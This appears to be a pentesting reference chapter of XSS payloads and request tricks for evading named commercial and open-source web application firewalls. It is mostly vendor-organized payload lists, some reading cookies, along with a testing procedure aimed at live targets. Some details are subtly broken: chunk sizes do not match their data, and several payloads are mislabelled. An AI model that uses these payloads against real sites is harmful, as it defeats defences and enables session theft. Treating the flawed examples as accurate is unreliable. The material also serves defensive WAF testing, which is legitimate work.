# 17 - WAF Bypass Specifically for XSS

## Overview

Web Application Firewalls (WAFs) inspect HTTP requests and responses to block malicious payloads before they reach the application. WAFs use pattern matching, anomaly scoring, machine learning models, and behavioral analysis. Each WAF vendor has distinct rule sets, parsing implementations, and detection logic, creating vendor-specific bypass opportunities. This document provides XSS bypass techniques and payloads organized by WAF vendor with general strategies applicable across all WAFs.

**Sources**: [waf-bypass.com](https://waf-bypass.com/), [gprime31/WAF-bypass-xss-payloads](https://github.com/gprime31/WAF-bypass-xss-payloads), [0xInfection/Awesome-WAF](https://github.com/0xInfection/Awesome-WAF), [WAFFLED Research Paper](https://arxiv.org/html/2503.10846v1), [Sysdig - Fuzzing AWS WAF](https://www.sysdig.com/blog/fuzzing-and-bypassing-the-aws-waf)

---

## 1. General WAF Bypass Strategies

### Encoding Layering (HTML -> URL -> JS)

WAFs typically decode one encoding layer. Stacking multiple encoding layers forces the WAF to miss the payload while the browser decodes all layers:

```
Original:  <svg onload=alert(1)>
URL encode:  %3Csvg%20onload%3Dalert(1)%3E
Double URL:  %253Csvg%2520onload%253Dalert(1)%253E
HTML+URL:    &lt;svg onload=al%65rt(1)&gt;  (server decodes HTML, browser decodes URL)

<!-- Triple encoding chain: -->
<!-- JS Unicode → HTML Entity → URL encode -->
\u003csvg\u0020onload\u003d\u0061lert(1)\u003e
→ &#x3c;svg onload=alert(1)&#x3e;
→ %26%23x3c%3Bsvg%20onload%3Dalert(1)%26%23x3e%3B
```

### Chunked Transfer Encoding

Split the payload across multiple chunks so no single chunk contains a complete attack pattern:

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
<sv
5
g onl
9
oad=aler
5
t(1)>
0
```

### Content-Type Manipulation

WAFs may only inspect bodies matching expected Content-Types:

```http
<!-- Standard form submission (WAF inspects) -->
Content-Type: application/x-www-form-urlencoded

<!-- Try these alternatives: -->
Content-Type: multipart/form-data; boundary=----X
Content-Type: text/plain
Content-Type: application/json
Content-Type: text/xml
Content-Type: application/xml

<!-- Multipart with charset trick (CVE-2026-21876 in CRS) -->
Content-Type: multipart/form-data; boundary=----X; charset=utf-7
```

**Source**: [CRS Project - CVE-2026-21876](https://coreruleset.org/20260106/cve-2026-21876-critical-multipart-charset-bypass-fixed-in-crs-4.22.0-and-3.3.8/), [Security Boulevard - Akamai Content-Encoding Bypass](https://securityboulevard.com/2023/02/bypassing-akamais-web-application-firewall-using-an-injected-content-encoding-header/)

### HTTP Parameter Pollution (HPP)

Send the same parameter multiple times; the WAF checks one instance while the application uses another:

```http
<!-- WAF checks first parameter, app uses last -->
GET /search?q=safe&q=<script>alert(1)</script>

<!-- Or split across parameters that get concatenated -->
GET /page?input=<script>&input=alert(1)</script>

<!-- Framework-specific parameter handling -->
<!-- PHP uses last value, ASP.NET concatenates with comma, Java uses first -->
```

### Multipart/Form-Data Bypass

```http
POST /submit HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="input"

<img src=x onerror=alert(1)>
------WebKitFormBoundary--

<!-- Trick: unusual boundary, extra headers, filename with payload -->
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="<img src=x onerror=alert(1)>.html"
Content-Type: text/html

payload
------WebKitFormBoundary--
```

### HTTP/2 Specific Manipulation

```
# HTTP/2 allows pseudo-headers and binary framing
# Some WAFs only inspect HTTP/1.1 representations

# Header injection via HTTP/2 pseudo-headers:
:path: /search?q=%3Cscript%3Ealert(1)%3C/script%3E

# HTTP/2 CONTINUATION frames can split headers across frames
# Some WAFs fail to reassemble these correctly

# Request smuggling via HTTP/2 → HTTP/1.1 downgrade:
# If the WAF processes HTTP/2 but the backend receives HTTP/1.1
```

### Request Line Manipulation

```http
<!-- Path-based bypass -->
GET /search%3Fq%3D<script>alert(1)</script> HTTP/1.1

<!-- Method override -->
POST /search HTTP/1.1
X-HTTP-Method-Override: GET
X-Original-URL: /search?q=<script>alert(1)</script>

<!-- Overlong URI may truncate WAF inspection -->
GET /search?padding=AAAA....(4096 bytes)....AAAA&q=<script>alert(1)</script>
```

---

## 2. Cloudflare WAF XSS Bypass

### Known Bypass Payloads (2023-2025)

```html
<!-- 1. Image tag with parentheses obfuscation (by @KN0X55) -->
<Img/Src/OnError=(alert)(1)>

<!-- 2. Script tag with fake attribute (by @xss0r) -->
'>alert(154)</script><script/154='>

<!-- 3. SVG with encoded event handler -->
<svg/onload=self[`al`+`ert`](1)>

<!-- 4. Null byte injection to break WAF parsing -->
<img src=x on\x00error=alert(1)>

<!-- 5. Details/summary with ontoggle -->
<details/open/ontoggle=alert(1)>

<!-- 6. Division by assignment trick -->
<img src=x onerror=alert?.(1)>

<!-- 7. Constructor chain -->
<img src=x onerror="[].constructor.constructor('alert(1)')()">

<!-- 8. Template literal -->
<svg onload=alert`1`>

<!-- 9. Unicode escapes in JS -->
<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>

<!-- 10. Nested encoding -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

### Encoding Tricks

```html
<!-- Cloudflare-specific encoding bypass approaches -->
<!-- HTML entities in event handler value -->
<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

<!-- URL-encoded payload in reflected parameter -->
%3Csvg%20o%6Eload%3Dalert(1)%3E

<!-- Double URL encoding -->
%253Csvg%2520onload%253Dalert(1)%253E

<!-- Mixed case with encoding -->
<SvG/oNlOaD=&#97;lert(1)>
```

### Path-Based Bypass

```
# Cloudflare may not inspect certain paths or file extensions
/static/<svg onload=alert(1)>.svg
/api/v1/search?callback=<script>alert(1)</script>
/.well-known/../search?q=<script>alert(1)</script>
```

**Source**: [gprime31/WAF-bypass-xss-payloads - Cloudflare](https://github.com/gprime31/WAF-bypass-xss-payloads/blob/master/Cloudflare%20xss%20payloads), [waf-bypass.com](https://waf-bypass.com/2025/01/21/waf-bypass-by-xsspayloads-22/), [Medium - Bypassing Cloudflare WAF](https://medium.com/@appsec.techie/bypassing-cloudflare-waf-to-trigger-reflected-xss-on-a-major-health-information-platform-bc71cf9cd1be)

---

## 3. AWS WAF XSS Bypass

### Known Payloads and Rule Set Weaknesses

```html
<!-- 1. AWS WAF managed rules may miss obscure tags -->
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>

<!-- 2. Tag/attribute combinations not in signatures -->
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>

<!-- 3. Atob bypass (keyword "alert" may be blocked) -->
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>

<!-- 4. String concatenation bypass -->
<img src=x onerror="window['al'+'ert'](1)">

<!-- 5. Uncommon event + encoding -->
<body onpageshow=alert(1)>

<!-- 6. JavaScript URI with tab -->
<a href="j&#9;avascript:alert(1)">click</a>

<!-- 7. Data URI -->
<object data="data:text/html,<script>alert(1)</script>">

<!-- 8. SVG animate -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### Encoding Bypasses for AWS WAF

```html
<!-- AWS WAF regex rules may not decode all encoding layers -->
<!-- Unicode escape sequences inside JavaScript context -->
<svg onload=\u0061lert(1)>

<!-- Overlong URL encoding -->
<img src=x onerror=%61lert(1)>

<!-- HTML entity encoding of JavaScript keywords -->
<img src=x onerror="&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;['alert'](1)">
```

**Source**: [Sysdig - Fuzzing and Bypassing AWS WAF](https://www.sysdig.com/blog/fuzzing-and-bypassing-the-aws-waf)

---

## 4. Akamai WAF (Kona) XSS Bypass

### Known Payloads and Kona Weaknesses

```html
<!-- 1. Event handler with assignment trick -->
<img src=x onerror=alert(1)//>

<!-- 2. SVG with nested foreignObject -->
<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>

<!-- 3. Non-standard tag -->
<xss style="behavior:url(#default#time2)" onbegin="alert(1)">

<!-- 4. Onmouseover with bracket obfuscation -->
" onmouseover=window['al'+'er'+(['t','b','c'][0])](document['cooki'+(['e','c','z'][0])]);"

<!-- 5. CRLF injection to bypass Content-Encoding check -->
<!-- Inject Content-Encoding: gzip header via CRLF, then send compressed payload -->
<!-- Akamai WAF fails to decompress and inspect the payload -->

<!-- 6. Backtick template literal -->
<svg onload=alert`1`>

<!-- 7. Custom tag with known event -->
<xss onclick=alert(1)>click</xss>

<!-- 8. String.fromCharCode evasion -->
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
```

### Encoding and Obfuscation for Akamai

```html
<!-- Double encoding -->
%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E

<!-- Unicode normalization -->
＜svg onload=alert(1)＞  <!-- fullwidth angle brackets -->

<!-- Null byte splitting -->
<scr\x00ipt>alert(1)</script>

<!-- Mixed encoding layers -->
<img src=x onerror="&#x65;val(atob('YWxlcnQoMSk='))">
```

**Source**: [Pushkarup/Akamai-WAF-Bypass-Payload](https://github.com/Pushkarup/Akamai-WAF-Bypass-Payload), [gprime31/WAF-bypass-xss-payloads - Akamai](https://github.com/gprime31/WAF-bypass-xss-payloads/blob/master/Akamai%20XSS%20payloads), [Security Boulevard - Akamai Content-Encoding Bypass](https://securityboulevard.com/2023/02/bypassing-akamais-web-application-firewall-using-an-injected-content-encoding-header/)

---

## 5. ModSecurity CRS XSS Bypass

### Per-CRS-Version Bypass

**CRS 3.x (Default Paranoia Level 1)**

```html
<!-- PL1 checks basic XSS patterns but misses: -->

<!-- 1. confirm() instead of alert() (CRS 4.0.0-rc2 issue) -->
<img src=x onerror=confirm(1)>

<!-- 2. print() function -->
<img src=x onerror=print()>

<!-- 3. Obscure event handlers not in PL1 signatures -->
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>

<!-- 4. Constructor chain (avoids alert/prompt/confirm keywords) -->
<img src=x onerror="[].constructor.constructor('ale'+'rt(1)')()">

<!-- 5. window.name payload (payload stored in window.name, not in request) -->
<img src=x onerror=eval(name)>
<!-- Set window.name via: window.open('https://target.com/vuln?q=<img...>', 'alert(1)') -->
```

**Source**: [CRS Issue #3381 - XSS Bypass](https://github.com/coreruleset/coreruleset/issues/3381), [CRS Issue #2512 - XSS Bypass on REQUEST-941](https://github.com/coreruleset/coreruleset/issues/2512)

**CRS 4.x Paranoia Level Differences**

```
PL1 (Default): Basic XSS patterns, common tags/events
  - Blocks: <script>, alert(, onerror=, onload=
  - Misses: obscure events, JS obfuscation, encoding tricks

PL2: Extended regexp-based XSS injection protection
  - Additional keywords: confirm, prompt, eval, Function
  - More event handlers covered
  - Still bypassable with constructor chains and encoding

PL3: Aggressive detection with higher false positive rate
  - Covers most event handlers
  - Detects encoding anomalies
  - Bypassable with mutation payloads and parser differentials

PL4: Maximum protection, extremely high false positive rate
  - Blocks most special characters
  - Very difficult to bypass but unusable for most applications
```

### ModSecurity-Specific Bypass Techniques

```html
<!-- 1. Path confusion bypass (affects libModSecurity v2 and v3) -->
<!-- ModSecurity may fail to correctly identify the request URI -->
<!-- allowing bypasses through path manipulation -->

<!-- 2. UTF-7 charset bypass (CVE-2026-21876) -->
<!-- Rule 922110 only validates the last multipart part's charset -->
Content-Type: multipart/form-data; boundary=X
--X
Content-Disposition: form-data; name="xss"
Content-Type: text/html; charset=utf-7

+ADw-script+AD4-alert(1)+ADw-/script+AD4-
--X
Content-Disposition: form-data; name="safe"
Content-Type: text/plain; charset=utf-8

normal text
--X--

<!-- 3. Request body processor bypass -->
<!-- If SecRequestBodyAccess is Off, body is not inspected -->
<!-- Test with POST body when only GET parameters are inspected -->

<!-- 4. Large request body exceeding SecRequestBodyLimit -->
<!-- Content beyond the limit is not inspected -->
```

**Source**: [SicuraNext - ModSecurity Path Confusion](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/), [CRS Project - CVE-2026-21876](https://coreruleset.org/20260106/cve-2026-21876-critical-multipart-charset-bypass-fixed-in-crs-4.22.0-and-3.3.8/)

---

## 6. WAF-Specific XSS Bypass Payloads (25+)

### Cloudflare Bypass Payloads

```html
<!-- CF-1 --><Img/Src/OnError=(alert)(1)>
<!-- CF-2 --><svg/onload=self['al'+'ert'](1)>
<!-- CF-3 --><details/open/ontoggle=alert(1)>
<!-- CF-4 --><img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<!-- CF-5 --><img src=x onerror="[].constructor.constructor('alert(1)')()">
<!-- CF-6 --><svg onload=alert`1`>
```

### AWS WAF Bypass Payloads

```html
<!-- AWS-1 --><marquee onstart=alert(1)>
<!-- AWS-2 --><input onfocus=alert(1) autofocus>
<!-- AWS-3 --><svg><animate onbegin=alert(1) attributeName=x dur=1s>
<!-- AWS-4 --><img src=x onerror="window['al'+'ert'](1)">
<!-- AWS-5 --><body onpageshow=alert(1)>
<!-- AWS-6 --><a href="j&#9;avascript:alert(1)">click</a>
```

### Akamai Bypass Payloads

```html
<!-- AK-1 --><svg><foreignObject><body onload=alert(1)>
<!-- AK-2 -->" onmouseover=window['alert'](1);"
<!-- AK-3 --><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<!-- AK-4 --><svg onload=alert`1`>
<!-- AK-5 --><xss onclick=alert(1)>click</xss>
<!-- AK-6 --><img src=x onerror="&#x65;val(atob('YWxlcnQoMSk='))">
```

### ModSecurity CRS Bypass Payloads

```html
<!-- MS-1 --><img src=x onerror=confirm(1)>
<!-- MS-2 --><img src=x onerror=print()>
<!-- MS-3 --><details open ontoggle=alert(1)>
<!-- MS-4 --><img src=x onerror="[].constructor.constructor('ale'+'rt(1)')()">
<!-- MS-5 --><img src=x onerror=eval(name)>
<!-- MS-6 --><img src=x onerror=top[/al/.source+/ert/.source](1)>
<!-- MS-7 --><svg onload=import('data:text/javascript,alert(1)')>
```

### Universal/Multi-WAF Payloads

```html
<!-- U-1. Polyglot XSS payload -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//

<!-- U-2. Encoding-heavy polyglot -->
<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- U-3. Template literal -->
<svg onload=alert`1`>

<!-- U-4. Constructor chain (avoids common keywords) -->
<x/onclick="({}).constructor.constructor('alert(1)')()">click

<!-- U-5. setTimeout string execution -->
<img src=x onerror=setTimeout`alert\x28\x31\x29`>

<!-- U-6. Base64 with dynamic eval -->
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
```

---

## Testing Methodology

1. **Identify the WAF**: Check response headers (`server`, `x-powered-by`), error pages (403 patterns), and CDN indicators
2. **Fingerprint WAF rules**: Send incremental payloads to determine which components trigger blocks (tags, events, JS functions, encoding)
3. **Test encoding layers**: URL encoding, double encoding, HTML entities, Unicode escapes, base64
4. **Test Content-Type variations**: Switch between form-urlencoded, multipart, JSON, XML, plain text
5. **Test HTTP method and header tricks**: HPP, method override headers, chunked transfer
6. **Test vendor-specific payloads**: Use the organized payloads above for the identified WAF
7. **Test body size limits**: Exceed `SecRequestBodyLimit` or equivalent with padding
8. **Test path-based bypasses**: Different URL patterns, file extensions, API endpoints
9. **Chain techniques**: Combine encoding + obscure event + JS obfuscation + Content-Type tricks
10. **Automate fuzzing**: Use tools like `wafbench`, `waf-bypass.com`, `nuclei` WAF bypass templates

### Recommended Tools

```bash
# WAF fingerprinting
wafw00f https://target.com

# Automated WAF bypass testing
python3 -m wafbypass -u "https://target.com/search?q=PAYLOAD"

# Nuclei WAF bypass templates
nuclei -u https://target.com -t waf-bypass/

# Manual encoding helper
echo -n '<script>alert(1)</script>' | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"
```

---

## References

- [waf-bypass.com - WAF Bypass Collection](https://waf-bypass.com/)
- [gprime31/WAF-bypass-xss-payloads](https://github.com/gprime31/WAF-bypass-xss-payloads)
- [0xInfection/Awesome-WAF](https://github.com/0xInfection/Awesome-WAF)
- [WAFFLED: Exploiting Parsing Discrepancies (2025)](https://arxiv.org/html/2503.10846v1)
- [Sysdig - Fuzzing and Bypassing AWS WAF](https://www.sysdig.com/blog/fuzzing-and-bypassing-the-aws-waf)
- [Pushkarup/Akamai-WAF-Bypass-Payload](https://github.com/Pushkarup/Akamai-WAF-Bypass-Payload)
- [Security Boulevard - Bypassing Akamai WAF with Content-Encoding](https://securityboulevard.com/2023/02/bypassing-akamais-web-application-firewall-using-an-injected-content-encoding-header/)
- [SicuraNext - ModSecurity Path Confusion](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [CRS Project - CVE-2026-21876](https://coreruleset.org/20260106/cve-2026-21876-critical-multipart-charset-bypass-fixed-in-crs-4.22.0-and-3.3.8/)
- [CRS Issue #3381 - XSS Bypass](https://github.com/coreruleset/coreruleset/issues/3381)
- [Medium - Bypassing Cloudflare WAF for XSS](https://medium.com/@appsec.techie/bypassing-cloudflare-waf-to-trigger-reflected-xss-on-a-major-health-information-platform-bc71cf9cd1be)
- [Medium - Bypassing WAFs in 2025](https://medium.com/@gasmask/bypassing-wafs-in-2025-new-techniques-and-evasion-tactics-fdb3508e6b46)

---
## [2024-2026 Research Update]

### 2025-2026 WAF Bypass Techniques

#### Cloudflare Mixed-Case Bypass

Cloudflare WAF rules are case-sensitive for certain tag/attribute combinations. Mixed-case variants bypass signature matching while browsers parse HTML case-insensitively:

```html
<!-- Mixed-case tag and event handler -->
<Img/Src/OnError=(alert)(1)>
<SvG/oNlOaD=&#97;lert(1)>
<DeTaIlS/oPeN/oNtOgGlE=alert(1)>

<!-- Mixed-case with parentheses obfuscation -->
<ImG sRc=x oNeRrOr=(alert)(document.domain)>

<!-- Self-closing with mixed case -->
<sVg OnLoAd=self[`al`+`ert`](1)>
```

**Why it works**: Cloudflare's managed rules use regex patterns that may match specific casing patterns. HTML parsing is case-insensitive, so `<SvG>` is equivalent to `<svg>`. By using unexpected case combinations, the payload avoids matching the WAF's signature database while remaining valid HTML.

#### Null Byte Injection

Null bytes (`\x00`, `%00`) disrupt WAF string parsing while being handled differently by browsers:

```html
<!-- Null byte in tag name -->
<scr%00ipt>alert(1)</script>

<!-- Null byte in event handler name -->
<img src=x on%00error=alert(1)>

<!-- Null byte between attribute name and value -->
<svg onload%00=alert(1)>

<!-- Null byte in JavaScript keyword -->
<img src=x onerror=al%00ert(1)>
```

**Why it works**: Many WAFs use C-based string processing where null bytes terminate strings. The WAF sees `<scr` and stops, while the browser ignores or strips the null byte and processes the full tag. Modern browsers vary in null byte handling -- test across Chrome, Firefox, and Edge.

#### Double Encoding Bypass

When the WAF decodes URL encoding once but the application decodes it a second time, double encoding bypasses the WAF:

```
<!-- Standard payload (blocked) -->
<svg onload=alert(1)>

<!-- Single URL encoding (often blocked) -->
%3Csvg%20onload%3Dalert(1)%3E

<!-- Double URL encoding (bypasses single-decode WAFs) -->
%253Csvg%2520onload%253Dalert(1)%253E

<!-- Double encoding of specific characters only -->
<svg onload%253Dalert(1)>

<!-- Triple encoding for multi-layer WAF stacks -->
%25253Csvg%252520onload%25253Dalert(1)%25253E
```

**Why it works**: The WAF URL-decodes the request and sees `%3Csvg%20onload%3Dalert(1)%3E`, which does not match its XSS patterns (still encoded). The backend application decodes again, producing `<svg onload=alert(1)>`. This is especially effective when a reverse proxy or CDN sits in front of the WAF.

#### Overlong UTF-8 Encoding Bypass

Overlong UTF-8 sequences use more bytes than necessary to encode a character. WAFs that validate UTF-8 strictly may reject them, but some backends accept them:

```
<!-- Standard < = U+003C = 0x3C (1 byte in UTF-8) -->
<!-- Overlong 2-byte encoding: 0xC0 0xBC -->
<!-- Overlong 3-byte encoding: 0xE0 0x80 0xBC -->

<!-- Overlong encoded < and > -->
%C0%BC%C0%BE  (overlong < and >)
%E0%80%BCsvg onload=alert(1)%E0%80%BE

<!-- Overlong encoded = sign (U+003D) -->
<svg onload%C0%BDalert(1)>
```

**Why it works**: RFC 3629 prohibits overlong UTF-8 sequences, and well-behaved parsers reject them. However, some application frameworks and older backends decode them permissively, converting the overlong sequence back to the intended character. If the WAF strictly rejects overlong sequences and the backend accepts them, the payload bypasses inspection.

**Note**: Overlong UTF-8 is less reliable than other techniques because modern web servers increasingly reject malformed UTF-8. Test against the specific backend technology.

### WAFFLED Research: Parser Differential Exploitation (2025)

The WAFFLED paper (arXiv 2503.10846, March 2025) documents systematic exploitation of parsing discrepancies between WAFs and backend applications:

**Key findings**:
- WAFs and applications parse the same HTTP request differently
- Differences in parameter parsing, Content-Type handling, and encoding normalization create bypass windows
- Chunked transfer encoding splits are especially effective against WAFs that reassemble chunks with size limits

**Practical technique -- Chunked Transfer with XSS**:
```http
POST /search HTTP/1.1
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

7
q=%3Csv
8
g+onloa
c
d%3Dalert(
3
1)%
2
3E
0
```

The payload `<svg onload=alert(1)>` is split across five chunks. WAFs that inspect individual chunks see no complete XSS pattern.

### CRS CVE-2026-21876: Critical Multipart Charset Bypass

**Affected versions**: CRS < 4.22.0 and CRS < 3.3.8

**Vulnerability**: Rule 922110 only validates the last multipart part's charset. An attacker can place the XSS payload in an earlier part with `charset=utf-7` (which allows `+ADw-script+AD4-` encoding for `<script>`) and then add a final safe part with `charset=utf-8`. The WAF validates only the last part's charset and misses the payload.

**Exploitation**:
```http
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="xss"
Content-Type: text/html; charset=utf-7

+ADw-script+AD4-alert(1)+ADw-/script+AD4-
--X
Content-Disposition: form-data; name="safe"
Content-Type: text/plain; charset=utf-8

normal text
--X--
```

**Fix**: Update to CRS >= 4.22.0 or >= 3.3.8.

**Source**: [CRS Project Advisory](https://coreruleset.org/20260106/cve-2026-21876-critical-multipart-charset-bypass-fixed-in-crs-4.22.0-and-3.3.8/)

### Updated WAF Bypass Payload Collection (2025-2026)

```html
<!-- WB-2025-01: Cloudflare mixed-case + constructor chain -->
<ImG sRc=x oNeRrOr=[].constructor.constructor('alert(1)')()>

<!-- WB-2025-02: AWS WAF double encoding -->
%253Csvg%2520onload%253Dalert(document.domain)%253E

<!-- WB-2025-03: Akamai null byte split -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- WB-2025-04: ModSecurity CRS UTF-7 charset bypass -->
Content-Type: text/html; charset=utf-7
+ADw-img src+AD0-x onerror+AD0-alert(1)+AD4-

<!-- WB-2025-05: Generic overlong UTF-8 -->
%C0%BCsvg%20onload%C0%BDalert(1)%C0%BE

<!-- WB-2025-06: Cloudflare optional chaining bypass -->
<img src=x onerror=alert?.(1)>

<!-- WB-2025-07: Chunked transfer split (use with HTTP/1.1) -->
Transfer-Encoding: chunked
(split payload across 3+ chunks)

<!-- WB-2025-08: Generic multi-encoding chain (HTML + URL + JS Unicode) -->
<svg onload=alert(1)>
```
